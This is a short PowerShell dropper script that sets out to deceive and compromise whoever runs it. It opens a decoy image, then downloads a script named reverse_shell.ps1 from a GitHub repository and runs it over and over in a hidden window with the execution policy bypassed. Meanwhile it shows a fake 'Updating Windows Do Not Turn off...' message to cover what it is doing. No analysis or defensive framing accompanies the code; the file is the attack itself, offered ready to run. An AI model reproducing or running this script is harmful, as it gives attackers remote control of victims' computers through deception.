# Change directory to the TEMP folder
Set-Location -Path $env:TEMP

# Display a "Do you want to install Bit Miner" message in the console
Add-Type -AssemblyName PresentationFramework
[System.Windows.MessageBox]::Show("Do you want to install Bit Miner", "Status", [System.Windows.MessageBoxButton]::OK, [System.Windows.MessageBoxImage]::Information)

# Download and open the image
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Issac-dev/GlitchGhost/main/bitmin.png" -OutFile "$env:TEMP\bitmin.png"
Start-Process "$env:TEMP\bitmin.png"

# Loop to download the PowerShell script file and run it every 10 seconds
$scriptUrl = "https://raw.githubusercontent.com/Issac-dev/GlitchGhost/main/reverse_shell.ps1"
$scriptPath = "$env:TEMP\reverse_shell.ps1"

# Download the reverse shell script initially
Invoke-WebRequest -Uri $scriptUrl -OutFile $scriptPath

# Infinite loop to execute the downloaded PowerShell script
while ($true) {
  
    # Run the downloaded PowerShell script in a hidden window
    Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File ${scriptPath}" -WindowStyle Hidden
    Write-Host "Updating Windows Do Not Turn off..."
    
    Start-Sleep -Seconds 30
}

# Exit the script
exit
